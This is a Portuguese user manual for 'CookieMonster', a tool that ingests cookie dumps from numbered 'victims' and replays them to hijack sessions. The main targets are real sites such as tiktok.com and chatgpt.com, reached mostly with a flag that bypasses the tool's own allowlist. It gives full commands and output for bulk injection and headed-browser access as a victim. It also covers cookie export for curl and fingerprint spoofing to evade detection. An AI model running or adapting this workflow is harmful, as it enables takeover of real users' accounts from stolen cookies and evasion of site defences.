# CookieMonster — Manual de Uso

Ferramenta CLI de **assessment de session hijacking** por cookie replay. Este manual cobre instalação, configuração e uso em ambiente de laboratório.

> **Aviso legal**: Use somente contra alvos com **autorização explícita** (pentest contratado, bug bounty, laboratório próprio). A ferramenta recusa alvos fora da allowlist local (`scope.txt`).

---

## Índice

1. [Conceito em 30 segundos](#1-conceito-em-30-segundos)
2. [Instalação](#2-instalação)
3. [Configuração de Escopo (`scope.txt`)](#3-configuração-de-escopo-scopetxt)
4. [Workflow Básico (M0–M4)](#4-workflow-básico-m0m4)
5. [Workflow Avançado](#5-workflow-avançado)
6. [Interpretando Resultados (M3 + M6.0)](#6-interpretando-resultados-m3--m60)
7. [Troubleshooting](#7-troubleshooting)
8. [Referência de Comandos (18 CLI)](#8-referência-de-comandos-18-cli)
9. [M6.0 AuthContext — Detecção de IdP e proteções](#9-m60-authcontext--detecção-de-idp-e-proteções)
10. [M6.2 ReplayMatrix — Identificar dependências](#10-m62-replaymatrix--identificar-dependências)
11. [M6.3 Correlator + OPT-A AttackChain](#11-m63-correlator--opt-a-attackchain)
12. [M7 AttackPlan — Orquestração declarativa YAML](#12-m7-attackplan--orquestração-declarativa-yaml)
13. [OPT-B StealthProfile (Canvas/WebGL/Font)](#13-opt-b-stealthprofile-canvaswebglfont)
14. [OPT-C Regras YAML customizadas](#14-opt-c-regras-yaml-customizadas)
15. [OPT-D Lab Profiles A–G](#15-opt-d-lab-profiles-ag)
16. [Estrutura do Projeto](#16-estrutura-do-projeto)
17. [Onde Pedir Ajuda](#17-onde-pedir-ajuda)

---

## 1. Conceito em 30 segundos

CookieMonster é um framework de **replay adversarial de cookies de sessão**:

1. **Ingere** dumps de cookies (formato Netscape/JSON).
2. **Identifica** quais cookies são aplicáveis a um alvo (RFC 6265).
3. **Replay** injeta os cookies num navegador headless ou requisição HTTP.
4. **Detecta** se o servidor aceitou a sessão (estado: AUTHENTICATED, IDP_BOUND, CONTEXT_BOUND, MFA_BLOCKED, BOT_BLOCKED, ANONYMOUS, INCONCLUSIVE).
5. **Identifica** o Identity Provider (Google, Microsoft, GitHub, Auth0, Okta, AWS Cognito) e o tipo de proteção.
6. **Correlaciona** Findings em cadeias de ataque com Impact assessment.
7. **Orquestra** via plano YAML declarativo com stop conditions.

> **Não implementa bypass** de MFA/Cloudflare/anti-bot em produção. A ferramenta detecta e classifica — o operador decide se quer investigar mais.

## 2. Instalação

```bash
# Clone
git clone https://github.com/skzun/CookieMonster.git
cd CookieMonster

# Instale o pacote em modo editável
pip install -e .

# Instale o Chromium para o Playwright (uma vez)
playwright install chromium

# Crie um venv se preferir (recomendado em ambiente corporativo)
python -m venv .venv
source .venv/bin/activate  # ou .venv\Scripts\activate no Windows
pip install -e .
playwright install chromium
```

**Dependências principais** (instaladas via `pip install -e .`):
- `httpx`, `playwright`, `click`, `rich`, `pyyaml` (opcional para OPT-C).

## 3. Configuração de Escopo (`scope.txt`)

Crie um arquivo `scope.txt` na raiz do projeto listando os domínios autorizados:

```
# Laboratorio local
127.0.0.1
localhost

# Alvos de teste autorizados
lab.example
chatgpt.com
tiktok.com
```

**Modo inseguro** (use apenas em lab isolado): passe `--allow-unsafe-scope` em qualquer comando para ignorar a allowlist.

## 4. Workflow Básico (M0–M4)

### 4.1 Ingestão (M0)

```bash
# Ingestão completa (~40 min para 9M cookies)
python -m cookiemonster ingest --dir Cookies --db store.db --resume

# Retomada: pula vítimas já ingeridas
python -m cookiemonster ingest --dir Cookies --db store.db --resume

# Para teste rápido: primeiras 10 vítimas
python -m cookiemonster ingest --dir Cookies --db store.db --limit 10
```

### 4.2 Match RFC 6265 (M1)

```bash
# Listar domínios e contagem
python -m cookiemonster domains

# Selecionar top 5 vítimas para um alvo
python -m cookiemonster best --db store.db --domain tiktok.com --limit 5

# Listar cookies aplicáveis a uma URL
python -m cookiemonster cookies --db store.db --victim 2390 --domain tiktok.com
```

### 4.3 Inject (M2)

```bash
# HTTP rapido (~1s por vitima)
python -m cookiemonster inject --db store.db --victim 2390 \
  --domain tiktok.com --channel httpx

# Playwright (canal canonico - executa JS, navega para rota protegida)
python -m cookiemonster inject --db store.db --victim 2390 \
  --domain tiktok.com --channel playwright --max-wait-ms 10000

# Com screenshot para evidencia
python -m cookiemonster inject --db store.db --victim 2390 \
  --domain tiktok.com --channel playwright \
  --screenshot-path evidence/2390_tiktok.png
```

### 4.4 Validate (M3)

```bash
# Validacao canonica (1 vitima)
python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com

# Modo canonico (Playwright + readiness condicional)
python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com \
  --channel playwright --max-wait-ms 10000
```

### 4.5 Report (M4)

```bash
# Relatorio consolidado (Markdown + JSON)
python -m cookiemonster report --db store.db --out reports

# Customizar limiar de UNKNOWN
python -m cookiemonster report --db store.db --unknown-threshold 0.5
```

## 5. Workflow Avançado

### 5.1 Sweep em escala

Use `lab/sweep_all.py` para varrer múltiplos domínios em paralelo:

```bash
# Gerar _targets.txt com candidatos (formato: dominio,victim_id)
python -m cookiemonster best --db store.db --domain tiktok.com --limit 1 | \
  awk '{print $1","$2}' > _targets.txt

# Sweep httpx (rapido, ~17s para 24 dominios)
python lab/sweep_all.py --targets _targets.txt --channel httpx

# Sweep Playwright (mais lento, ~2min para 24 dominios)
python lab/sweep_all.py --targets _targets.txt --channel playwright
```

### 5.2 Edit (M2)

```bash
# 1) Captura valor original
python -m cookiemonster inject --db store.db --victim 2390 \
  --domain tiktok.com --show _octo

# 2) Edita _octo para um valor arbitrario
python -m cookiemonster edit --db store.db --victim 2390 \
  --cookie _octo --value "INVALIDO"

# 3) Re-roda check - o servidor deve rejeitar
python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com

# 4) Restaura valor original
python -m cookiemonster edit --db store.db --victim 2390 \
  --cookie _octo --value "<original>"
```

### 5.3 Timeouts Playwright

```bash
# Conservador (rapido, pode perder sinal em SPA lentas)
python -m cookiemonster check --db store.db --victim 1 --domain x.com --max-wait-ms 4000

# Padrao (recomendado)
python -m cookiemonster check --db store.db --victim 1 --domain x.com --max-wait-ms 8000

# Paciente (SPAs com fetch assincrono pesado)
python -m cookiemonster check --db store.db --victim 1 --domain x.com --max-wait-ms 15000
```

## 6. Interpretando Resultados (M3 + M6.0)

### 6.1 Estados do detector (M3 legado)

| Estado | Significado | Confianca tipica |
|---|---|---|
| CONFIRMED | Sessao autenticada confirmada | 0.85–0.95 |
| LIKELY | UI autenticada, sem identidade explicita | 0.6–0.7 |
| ANONYMOUS | Servidor rejeitou explicitamente | 0.85 |
| UNKNOWN | Evidencia insuficiente | 0.30 |

### 6.2 Estados estendidos (M6.0 — coexiste com M3)

| Estado | Significado | Confianca |
|---|---|---|
| AUTHENTICATED | Sessao confirmada (identidade + UI) | 0.90 |
| CONTEXT_BOUND | Sessao exige contexto (IP/device) | 0.70 |
| IDP_BOUND | Sessao depende de validacao no IdP externo | 0.85 |
| MFA_BLOCKED | IdP exige MFA | 0.85 |
| BOT_BLOCKED | Anti-bot challenge (Cloudflare, reCAPTCHA) | 0.85 |
| ANONYMOUS | Servidor rejeitou | 0.85 |
| INCONCLUSIVE | Evidencia insuficiente | 0.30 |

### 6.3 Identificando o bloqueador

A saida M6.0 mostra:
- `Mechanism`: OIDC, OAuth, SAML, cookie_session, jwt_bearer, api_key
- `IdP`: Google, Microsoft, GitHub, Facebook, Apple, Auth0, Okta, AWS Cognito
- `Session type`: server_side_cookie, jwt_cookie, jwt_local_storage, jwt_memory, opaque_token
- `Dependencies`: idp, mfa, browser_state, cookie_only
- `Reason`: string canonica (ex: `identity_provider_boundary:google`)

**Exemplo de saida real (chatgpt.com com Google OAuth):**
```
[4] REPLAY RESULT (M6.0 AuthContext)
    >>> Classification: IDP_BOUND (ACESSO BLOQUEADO POR IDP)
    >>> Confidence:     0.85
    >>> Reason:         identity_provider_boundary:google
    >>> Mechanism:      oidc
    >>> IdP:            google (login via terceiro)
    >>> Session type:   unknown
    >>> Dependencies:   idp
    >>> Sessao requer validacao no Identity Provider externo.
```

### 6.4 Por que tantos UNKNOWN em SPAs

Sites como `chatgpt.com`, `tiktok.com`, `primevideo.com` resultam em UNKNOWN massivo porque:

1. **SPA React/Vue/Angular**: homepage renderiza a mesma UI para anonimo e autenticado.
2. **Sem endpoint publico de identidade**: cookie de sessao so e validado internamente.
3. **Identidade so apos interacao**: clicar em "Settings" revela o email.

**Solucao**: probe contra endpoint de identidade diretamente:
```bash
python -m cookiemonster probe --domain chatgpt.com \
  --url https://chatgpt.com/api/auth/session --allow-unsafe-scope
```

## 7. Troubleshooting

### "Recusado: alvo fora da allowlist"
Adicione o dominio em `scope.txt` ou use `--allow-unsafe-scope`.

### "Nenhum cookie aplicavel"
- Verifique dominio dos cookies vs URL alvo.
- Verifique `secure` (cookie com `Secure` nao casa com `http://`).
- Use `python -m cookiemonster cookies --victim <id> --domain <dom> --scheme <http|https>` para inspecionar.

### Playwright timeout
Aumente `--max-wait-ms` (ate 20000 para SPAs muito lentas).

### `cookies.json` JSON dentro de arquivos `.txt`
A ferramenta detecta automaticamente JSON mesmo em `.txt`. Vera `json files: N` no relatorio de ingest.

### Public Suffix List falhou
Delete `%USERPROFILE%\.cache\cookiemonster\public_suffix_list.dat` para forcar refresh.

### Probe com Cloudflare bloqueia
Use `--channel playwright` (httpx e detectado). Para bypass de fingerprint, use OPT-B (StealthProfile) — ver secao 13.

## 8. Referência de Comandos (18 CLI)

CookieMonster tem 18 comandos CLI. Aqui vao os principais com exemplos reais:

### `domains`
Lista dominios e contagem de cookies.
```bash
python -m cookiemonster domains
```

### `victims`
Lista vitimas ingeridas.
```bash
python -m cookiemonster victims
```

### `best` (M1)
Seleciona as melhores vitimas para um dominio.
```bash
python -m cookiemonster best --db store.db --domain tiktok.com --limit 5
```

### `cookies` (M1)
Lista cookies aplicaveis a um alvo.
```bash
python -m cookiemonster cookies --db store.db --victim 2390 --domain tiktok.com
```

### `ingest` (M0)
Ingere dumps de cookies.
```bash
python -m cookiemonster ingest --dir Cookies --db store.db --resume
```

### `inject` (M2)
Injeta cookies num contexto HTTP ou Playwright.
```bash
python -m cookiemonster inject --db store.db --victim 2390 --domain tiktok.com --channel httpx
```

### `check` (M3)
Valida 1 vitima (canalico).
```bash
python -m cookiemonster check --db store.db --victim 2390 --domain tiktok.com
```

### `check-batch` (M3)
Valida N vitimas em lote.
```bash
python -m cookiemonster check-batch --db store.db --domain tiktok.com --limit 5
```

### `edit` (M2)
Edita valor de cookie para teste de injecao.
```bash
python -m cookiemonster edit --db store.db --victim 2390 --cookie _octo --value "TESTE"
```

### `report` (M4)
Consolida runs+findings em console, JSON e Markdown.
```bash
python -m cookiemonster report --db store.db --out reports
```

### `probe` (pipeline unificado — **comando principal**)
Pipeline `best + cookies + inject + check` com saida M6.0 estruturada.
```bash
# Reproduzivel rapido
python -m cookiemonster probe --domain tiktok.com --allow-unsafe-scope

# Com URL custom (para endpoints de identidade)
python -m cookiemonster probe --domain chatgpt.com \
  --url https://chatgpt.com/api/auth/session --allow-unsafe-scope

# Com stealth profile (OPT-B)
python -m cookiemonster probe --domain tiktok.com \
  --stealth-profile ~/.config/cookiemonster/stealth/lab-canvas-noise.json \
  --allow-unsafe-scope
```

**Saida real** (chatgpt.com + Google OAuth):
```
[4] REPLAY RESULT (M6.0 AuthContext)
    >>> Classification: IDP_BOUND (ACESSO BLOQUEADO POR IDP)
    >>> Confidence:     0.85
    >>> Reason:         identity_provider_boundary:google
    >>> Mechanism:      oidc
    >>> IdP:            google
    >>> Dependencies:   idp
```

### `probe-all` (varias vitimas em paralelo)
Executa probe em TODAS as vitimas de um dominio.
```bash
# httpx rapido (3 vitimas em ~2s)
python -m cookiemonster probe-all --domain tiktok.com \
  --channel httpx --limit 3 --workers 3 --allow-unsafe-scope

# Playwright (mais lento, 3 vitimas em ~15s)
python -m cookiemonster probe-all --domain chatgpt.com \
  --channel playwright --limit 3 --max-wait-ms 10000 --allow-unsafe-scope
```

Suporta **Ctrl+C** para cancelamento gracioso (para quando achar autenticado ou bloqueado consistente).

### `access` (headed browser)
Abre Chrome com cookies injetados. Voce interage visualmente.
```bash
python -m cookiemonster access --domain tiktok.com --allow-unsafe-scope

# Com vitima especifica
python -m cookiemonster access --domain tiktok.com --victim 2390 --allow-unsafe-scope

# Sem esperar ENTER (fecha apos timeout)
python -m cookiemonster access --domain tiktok.com --no-wait-enter --max-wait-ms 10000
```

Salva screenshot em `evidence/access_<host>_<vid>.png`. Detecta se a URL final caiu em pagina de login.

### `export-cookies`
Exporta cookies aplicaveis em formato Netscape (curl) ou JSON.
```bash
# Netscape (pronto para curl)
python -m cookiemonster export-cookies --domain tiktok.com -o tiktok.txt
curl -b tiktok.txt https://www.tiktok.com/

# JSON (estruturado)
python -m cookiemonster export-cookies --domain tiktok.com --format json -o tiktok.json
```

### `dashboard` (resumo amigavel)
Mostra os ultimos runs com classificacao.
```bash
python -m cookiemonster dashboard

# Mais runs
python -m cookiemonster dashboard --limit 50
```

**Saida real** (depois de varios probes):
```
TOTAL: 136 runs
  CONFIRMED (acesso confirmado): 3
  LIKELY (acesso provavel):       3
  ANONYMOUS (acesso rejeitado):   32
  UNKNOWN (indeterminado):       82

Diagnostico dos 82 UNKNOWN (motivos):
  sem_diferencial                82 runs
```

### `matrix` (M6.2 — Replay Matrix)
Identifica dependencias da sessao via variacoes de contexto.
```bash
python -m cookiemonster matrix --domain tiktok.com --max-variants 4 --allow-unsafe-scope
```

**Saida real**:
```
Variantes da matriz:
  1. net=default,br=default,ck=none
  2. net=default,br=default,ck=artifact
  3. net=default,br=preserved,ck=none
  4. net=default,br=preserved,ck=artifact

  net=default,br=default,ck=none      state=INCONCLUSIVE  0.30  1.0s
  net=default,br=default,ck=artifact  state=INCONCLUSIVE  0.30  0.8s
  ...

=== DEPENDENCY ANALYSIS ===
  Dependencies inferred: inconclusive
  Evidencia insuficiente para inferir dependencias.
```

### `correlate` (M6.3 — Grafo de correlacao + OPT-A AttackChains)
Constroi grafo de Findings + Attack Chains.
```bash
# Ultimos 10 runs
python -m cookiemonster correlate --limit 10

# Filtrar por dominio
python -m cookiemonster correlate --domain chatgpt.com --limit 5

# Com regras customizadas (OPT-C)
python -m cookiemonster correlate --rules-file my-rules.yaml --limit 5

# Salvar Markdown
python -m cookiemonster correlate --limit 5 --out graph.md
```

**Saida real**:
```
Findings: 40
  session_artifact                    10
  session_replayable                  10
  ...
Graph: 40 nodes, 200 edges

Attack Chains (10):

--- Chain #1 ---
  [INFO    ] session_artifact               (1.00) @ tiktok.com run#139
  [INFO    ] session_replay                 (0.30) @ tiktok.com run#139
```

### `attack-plan` (M7 — Orquestracao declarativa YAML)
Executa pipeline completo (discover → classify → replay → observe → correlate) com stop conditions e Impact assessment.

**Exemplo de YAML** (ver secao 12 para detalhes):
```yaml
target: tiktok.com
victim: 2390
phases: [discover, classify, replay, observe, correlate]
replay:
  transports: [http, browser]
  max_victims: 10
  workers: 3
stop_conditions: [authenticated, blocked]
```

**Execucao**:
```bash
# Plan minimo via CLI
python -m cookiemonster attack-plan --target tiktok.com --allow-unsafe-scope

# Plan completo via YAML
python -m cookiemonster attack-plan --plan-file my-plan.yaml --allow-unsafe-scope
```

**Saida real** (5 phases em 18s):
```
=== CookieMonster: attack-plan ===
  Plan ID:   94999e06
  Target:    tiktok.com
  Phases:    discover -> classify -> replay -> observe -> correlate

# AttackPlan: tiktok.com
  Duration: 18.4s

## 8.5 Exemplo de saida real (Impact Assessment)

```
## Impact Assessment
  Severity:    INFO
  Confidence:  0.50
  Authenticated: False

## Phases
  * discover     OK (4.8s, 1 findings)
```
  * classify     OK (6.8s, 0 findings)
  * replay       OK (6.8s, 0 findings)
  * observe      OK (0.0s, 1 findings)
  * correlate    OK (0.0s, 1 findings)

>>> IMPACT: INFO <<<
```

## 9. M6.0 AuthContext — Detecção de IdP e proteções

A partir de M6.0, CookieMonster detecta **automaticamente** o contexto de autenticacao do alvo:

- **8 Identity Providers**: Google, Microsoft, GitHub, Facebook, Apple, Auth0, Okta, AWS Cognito.
- **6 Auth Mechanisms**: cookie_session, oauth, oidc, saml, jwt_bearer, api_key.
- **5 Session Types**: server_side_cookie, jwt_cookie, jwt_local_storage, jwt_memory, opaque_token.
- **2 Protecoes**: anti-bot (Cloudflare, reCAPTCHA), MFA (mfa_required, amr claims).

### Detectores passiveis (sem bypass)

O `AuthDetector` em `cookiemonster/auth/detector.py` usa fingerprints passiveis:

```python
from cookiemonster.auth import detect_all, classify

# Observacao de uma unica requisicao (body, url, cookies, title):
observation = {
    "url": "https://x.com/api/auth/session",
    "body": '{"user": {"email": "x@y.com", "idp": "google-oauth2"}, "id_token": "eyJ..."}',
    "html": "...", "title": "x",
    "cookie_names": ["__Secure-next-auth.session-token"],
}

ctx = detect_all(observation, target="x.com")
# ctx.identity_provider == IdentityProvider.GOOGLE
# ctx.auth_mechanism == AuthMechanism.OIDC

# Classificacao com evidencias:
from cookiemonster.auth import classify
result = classify(
    inj={"api_user_id_present": True, "api_authenticated": True, "authenticated_ui": False},
    base={"api_user_id_present": False, "api_authenticated": False, "authenticated_ui": False},
    ctx=ctx,
)
# result["state"] == "idp_bound"
# result["context_dependencies"] == ["idp"]
```

### Caso `api_only` (API reconhece mas UI nao)

Quando a API reconhece a identidade (`api_user_id_present: True`) mas a UI nao confirma (`authenticated_ui: False`), a ferramenta classifica como `IDP_BOUND` (rebaixado de `AUTHENTICATED`) com motivo `api_only_no_ui`. Isso acontece com:

- **NextAuth/Auth.js** com cookies parcialmente expirados (cookie de API ok + cookie de UI expirado).
- **OAuth com IdP externo** (Google) onde `cf_clearance` foi invalidado por mudança de IP.

A ferramenta **nao afirma** que a sessao esta quebrada — ela classifica e mostra o motivo para o operador decidir.

### Quando `IDP_BOUND` aparece

```
[4] REPLAY RESULT (M6.0 AuthContext)
    >>> Classification: IDP_BOUND (ACESSO BLOQUEADO POR IDP)
    >>> Reason:         identity_provider_boundary:google
    >>> IdP:            google (login via terceiro)
    >>> Dependencies:   idp
    >>> Sessao requer validacao no Identity Provider externo.
        (cf_clearance expirado / IdP check de IP/fingerprint).
```

**Acoes sugeridas**:
1. Veja screenshot em `evidence/access_<host>_<vid>.png`.
2. Se a UI mostra email da vitima pedindo senha: sessao API esta OK, UI precisa de re-login.
3. Se a UI mostra login generico: cookies expiraram completamente.

## 10. M6.2 ReplayMatrix — Identificar dependências

`matrix` executa variacoes de contexto (network × browser × cookies) e infere **automaticamente** o que a sessao reproduzida depende.

### Matriz canonica (5 variants)

| Variant | network | browser | cookies |
|---|---|---|---|
| B0 (baseline) | default | default | none |
| R1 (canonical) | default | default | artifact |
| R2 (network_alt) | controlled_alternate | default | artifact |
| R3 (browser_pres) | default | preserved | artifact |
| R4 (combined) | controlled_alternate | preserved | artifact |

### Dependency analysis (5 cenarios)

| Dependencia inferida | Significado |
|---|---|
| `cookie_only` | Todas variants autenticam (replay funciona sem contexto extra) |
| `network` | Canonical autentica mas network_alt nao (sessao exige IP) |
| `browser` | Canonical autentica mas browser_pres nao (sessao exige fingerprint) |
| `context` | Nenhuma autentica mas combined sim (precisa de contexto adicional) |
| `inconclusive` | Sem dados suficientes |

### Stop conditions

A matriz para cedo quando:
- **authenticated_found**: alguma variant deu AUTHENTICATED.
- **bot_blocked_consistent**: >=2 variants dao BOT_BLOCKED.
- **anonymous_consistent**: >=2 variants dao ANONYMOUS.

### Limitacoes atuais

- `network_alternate` e `browser_preserved` ainda nao estao **implementados** no executor (apenas marcam a variant). O resultado eh sempre `INCONCLUSIVE` ate voce usar um proxy real ou fingerprint preservado. Para lab, isso eh proposital — em producao, voce adiciona SOCKS5 (fora do escopo).

## 11. M6.3 Correlator + OPT-A AttackChain

`correlate` le runs do DB, gera **Findings canonicos**, aplica **9 regras declarativas**, e constroi um **grafo de correlacao**.

### Finding canônico (14 tipos)

```
SESSION_ARTIFACT, SESSION_REPLAYABLE, SESSION_REPLAY,
AUTH_STATE_CONFIRMED, AUTH_STATE_REJECTED, AUTH_STATE_INDETERMINATE,
SESSION_CONTEXT_BOUND, AUTH_BOUNDARY, MFA_BLOCK, ANTI_BOT_BLOCK,
DEPENDENCY_INFERRED, AUTHENTICATED_STATE, PROTECTED_RESOURCE
```

### 9 regras default

| if | and | then | Descricao |
|---|---|---|---|
| SESSION_ARTIFACT | | enables SESSION_REPLAY | Cookie dump habilita replay |
| SESSION_REPLAYABLE | | enables SESSION_REPLAY | Matching RFC 6265 habilita replay |
| SESSION_REPLAY | AUTH_STATE_CONFIRMED | enables AUTHENTICATED_STATE | Replay+confirmed habilita auth |
| AUTH_STATE_CONFIRMED | | enables PROTECTED_RESOURCE | Confirmed habilita recurso |
| AUTH_BOUNDARY | | blocks AUTHENTICATED_STATE | IdP bloqueia auth |
| MFA_BLOCK | | blocks AUTHENTICATED_STATE | MFA bloqueia auth |
| ANTI_BOT_BLOCK | | blocks SESSION_REPLAY | Anti-bot bloqueia replay |
| AUTH_STATE_REJECTED | | blocks AUTHENTICATED_STATE | Rejected bloqueia auth |
| SESSION_CONTEXT_BOUND | | requires DEPENDENCY_INFERRED | Context requer dependency |

### OPT-A: AttackChain (caminho de impacto)

`build_chains()` percorre o grafo via DFS seguindo edges ENABLES ate endpoint de auth, gerando **AttackChains** com severity, confidence, e summary human-readable.

**Exemplo de render**:
```
ATTACK CHAIN (3 findings, 2 edges)
============================================================
[CRITICAL] auth_state_confirmed       (conf 0.95) @x.com run#100
      |
      v  --enables-->
[CRITICAL] protected_resource          (conf 0.90) @x.com run#100
============================================================
IMPACT: CRITICAL (0.95)
  Cookie artifact capturado -> sessao autenticada confirmada
```

## 12. M7 AttackPlan — Orquestração declarativa YAML

Em vez de chamar `probe`, `probe-all`, `matrix`, `correlate` separadamente, descreva o **plano** em YAML e o executor monta a cadeia.

### Schema YAML

```yaml
# Alvo obrigatorio.
target: tiktok.com

# Vitima especifica (opcional; default = melhor para o target).
victim: 2390

# Phases a executar em ordem.
# Validas: discover, classify, replay, observe, correlate
phases:
  - discover
  - classify
  - replay
  - observe
  - correlate

# Configuracao da fase replay.
replay:
  # Transports validos: http, browser
  transports: [http, browser]
  # Variantes de contexto (subset de M6.2). default sempre incluso.
  context_variants: [default]
  # Timeout maximo para readiness (ms).
  max_wait_ms: 10000
  # Maximo de vitimas a processar (0 = todas).
  max_victims: 10
  # Workers paralelos (Playwright pesado: max 4).
  workers: 3
  # Quando parar a fase replay cedo.
  # Validos: authenticated, blocked, inconclusive
  stop_when: authenticated

# Stop conditions globais (parar o plano inteiro).
# Validos: authenticated, blocked, inconclusive
stop_conditions:
  - authenticated
  - blocked

# Metadata arbitraria para o report.
metadata:
  operator: redteam@example.com
  authorization: bug-bounty-program/123
  notes: Primeiro probe contra a API endpoint para reduzir custo de browser.
```

### Exemplo completo

Veja `docs/examples/attack-plan.example.yaml`.

### Impact Assessment

Apos executar, o plano gera um **ImpactAssessment** com severity (INFO/LOW/MEDIUM/HIGH/CRITICAL) baseado nos findings:

| Severity | Quando |
|---|---|
| CRITICAL | AUTHENTICATED real |
| HIGH | MFA_BLOCKED, BOT_BLOCKED, REJECTED com anti-bot |
| MEDIUM | IDP_BOUND, CONTEXT_BOUND |
| LOW | REJECTED (sessao invalida) |
| INFO | Sem dados suficientes |

## 13. OPT-B StealthProfile (Canvas/WebGL/Font)

**Stealth nao implementa bypass** — apenas reduz o fingerprint do navegador para evitar deteccao passiva. Use apenas em lab com autorizacao.

### Como funciona

`StealthProfile` injeta JavaScript via `context.add_init_scripts()` no Playwright **antes** de qualquer pagina carregar:

- **Canvas noise** (`HTMLCanvasElement.prototype.toDataURL`): randomiza pixels minimos no canvas fingerprint.
- **WebGL mask** (`getParameter(37445/37446)`): retorna `"Intel Inc."` independente da GPU real.
- **Font mask** (`navigator.fonts`): retorna stub em vez de enum de fontes instaladas.

### 3 profiles built-in (opt-in)

```python
from cookiemonster.stealth import list_builtin_profiles
profiles = list_builtin_profiles()
# "lab-canvas-noise" (risk=low)
# "lab-webgl-mask" (risk=low)
# "lab-full-stealth" (risk=medium, canvas+webgl+font)
```

### Custom profile (YAML/JSON)

```json
{
  "name": "custom",
  "description": "Canvas + UA override",
  "risk": "low",
  "required_authorization": "lab",
  "canvas_noise": true,
  "ua_override": "Mozilla/5.0 (custom) AppleWebKit/537.36"
}
```

### Uso

```bash
# Profile built-in
python -m cookiemonster probe --domain tiktok.com \
  --stealth-profile ~/.config/cookiemonster/stealth/lab-canvas-noise.json \
  --allow-unsafe-scope

# Custom profile
python -m cookiemonster probe --domain tiktok.com \
  --stealth-profile ./my-stealth.json --allow-unsafe-scope
```

**Aviso explicito** no terminal:
```
>>> STEALTH PROFILE ATIVO: lab-canvas-noise (risk=low)
  Canvas fingerprint noise (adiciona ruido minimo)
  Authorization: lab
```

### Validacao real (4 testes de browser)

Confirmado que os scripts **realmente executam** no Playwright:
- `toDataURL` retorna dados modificados (canvas noise OK).
- `getParameter(37445)` retorna `"Intel Inc."` (WebGL mask OK).
- `navigator.fonts.check('Arial')` retorna `True` (font stub OK).
- `lab-full-stealth` aplica os 3 simultaneamente.

## 14. OPT-C Regras YAML customizadas

O operador pode estender as **9 regras default** com regras proprias via `~/.config/cookiemonster/rules.yaml` ou `--rules-file <path>`.

### Formato

```yaml
rules:
  - if: SESSION_ARTIFACT
    then: enables SESSION_REPLAY
    label: custom rule

  - if: AUTH_BOUNDARY
    and: [SESSION_REPLAY]
    then: blocks PROTECTED_RESOURCE
    label: idp blocks resource access
```

### Uso

```bash
# ~/.config/cookiemonster/rules.yaml (carregado automaticamente)
python -m cookiemonster correlate --limit 10

# Custom file
python -m cookiemonster correlate --rules-file my-rules.yaml --limit 10
```

Quando regras custom sao carregadas:
```
OPT-C: 2 regras customizadas carregadas (total: 12)
```

### Validacao

- `if` ausente → erro.
- `then` invalido (sem `kind`) → erro.
- `FindingType`/`EdgeKind` invalidos → erro com lista de validos.

## 15. OPT-D Lab Profiles A–G

7 ambientes **propositalmente vulneraveis** para validar deteccoes CookieMonster em condicoes controladas. O target (servidor) eh um projeto separado; este modulo define as **expectativas**.

| Lab | Protection | Expected Outcome | Variant recomendada |
|---|---|---|---|
| **A** | cookie_only | AUTHENTICATED | default |
| **B** | cookie + IP binding | CONTEXT_BOUND | controlled_alternate |
| **C** | cookie + device binding | CONTEXT_BOUND | preserved |
| **D** | OAuth front-channel | IDP_BOUND | default |
| **E** | OAuth + MFA | MFA_BLOCKED | default |
| **F** | anti-bot challenge | BOT_BLOCKED | default |
| **G** | rotating session | INCONCLUSIVE | default |

### Acesso programatico

```python
from cookiemonster.lab import get_lab, list_labs, export_scenarios_json

lab = get_lab("D")
print(lab.protection, lab.expected_outcome)

labs = list_labs()
print(f"Total: {len(labs)} labs")

# Exportar cenarios como JSON (para lab target externo)
js = export_scenarios_json()
open("scenarios.json", "w").write(js)
```

### Saida em `docs/labs/scenarios.json`

```json
{
  "version": "1.0",
  "labs": [
    {
      "name": "Lab A - cookie only",
      "protection": "cookie_only",
      "expected_outcome": "authenticated",
      "matrix_variant": "default"
    },
    ...
  ]
}
```

### Limitacoes

- OPT-D **nao implementa** o lab target. A implementacao do servidor que produz cada comportamento eh um projeto separado.
- O modulo `lab/` apenas **documenta as expectativas** para o CookieMonster.

## 16. Estrutura do Projeto

```
cookiemonster/
├── auth/         # M6.0 - AuthContext + Detector + Classification
├── correlate/    # M6.3 + OPT-A - Finding canônico + grafo + AttackChain
├── domain/       # M1 - RFC 6265 matcher
├── ingest/       # M0 - parsers Netscape/JSON
├── inject/       # M2 - httpx + Playwright clients
├── lab/          # OPT-D - 7 lab profiles A-G
├── plan/         # M7 - AttackPlan YAML + executor
├── replay/       # M6.2 - ReplayMatrix + DependencyAnalyzer
├── report/       # M4 - JSON/Markdown report
├── stealth/      # OPT-B - StealthProfile opt-in
├── store/        # SQLite persistence
├── util/         # scope, PSL, helpers
├── validate/     # M3 + M5 - detector + profiles
└── cli.py        # 18 comandos CLI

docs/
├── MANUAL.md                  # este arquivo
├── examples/
│   └── attack-plan.example.yaml
└── labs/
    └── scenarios.json

tests/                          # 232 testes pytest
lab/
└── sweep_all.py                # sweep paralelo
scope.txt                       # allowlist
README.md                       # quickstart
```

## 17. Onde Pedir Ajuda

- **Issues**: https://github.com/skzun/CookieMonster/issues
- **Documentacao**: este MANUAL + `docs/ARCHITECTURE.md`
- **Exemplos**: `docs/examples/attack-plan.example.yaml`

---

**Versao do manual**: M7 + OPT-A-D (CookieMonster v1.0).
**Ultima atualizacao**: ver git log.
**Testes**: 232 verdes.
